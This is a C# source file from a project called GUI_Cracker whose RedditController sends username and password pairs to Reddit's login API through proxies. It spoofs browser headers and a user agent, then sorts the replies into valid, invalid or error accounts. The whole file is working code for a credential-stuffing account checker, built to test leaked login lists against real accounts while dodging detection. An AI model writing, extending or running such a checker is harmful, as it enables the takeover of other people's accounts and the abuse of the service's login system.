using Newtonsoft.Json;
using GUI_Cracker.Core.Enumerations;
using GUI_Cracker.Core.Models;
using GUI_Cracker.Core.Objects;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using GUI_Cracker;

namespace GUI_Cracker.Core.Controllers
{
    public static class RedditController
    {
       
        public static LoginResponse Validate(Account account, Proxy proxy)
        {
            string postdata = $"op=login-main&user={account.Username}&passwd={account.Password}&api_type=json";
            byte[] data = Encoding.UTF8.GetBytes(postdata);

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.reddit.com/api/login/username");
            request.Proxy = new WebProxy(proxy.ToString());
            request.Method = "POST";
            request.Accept = "application/json, text/javascript, */*; q=0.01";
            request.Host = "www.reddit.com";
            request.Referer = "https://www.ssl.reddit.com";
            request.KeepAlive = true;
            request.ContentLength = postdata.Length;
            request.Headers.Add("X-Requested-With: XMLHttpRequest");
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36";
            request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
            request.Headers.Add("Accept-Encoding: gzip, deflate, br");
            request.Headers.Add("Accept-Language: en-US,en;q=0.8");
            request.Headers.Add("X-Requested-With: XMLHttpRequest");
            request.CookieContainer = account.Cookies;

            using (Stream requestStream = request.GetRequestStream())
            {
                requestStream.Write(data, 0, data.Length);
            }

            Response jsonResponse;
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (var sr = new StreamReader(response.GetResponseStream()))
                {
                    string responseData = sr.ReadToEnd();
                    Console.WriteLine(responseData);
                    jsonResponse = JsonConvert.DeserializeObject<Response>(responseData);
                }
            }
 
            foreach (object error in jsonResponse.Json.Errors)
            {
                if (error.ToString().Contains("INCORRECT_USERNAME_PASSWORD"))
                {
                    return LoginResponse.Fail;
                }
            }

            if (jsonResponse.Json.Errors.Count == 0)
            {  
                return LoginResponse.Success;
            }
            else
            {
                return LoginResponse.Error;

            }

        }
    }
}
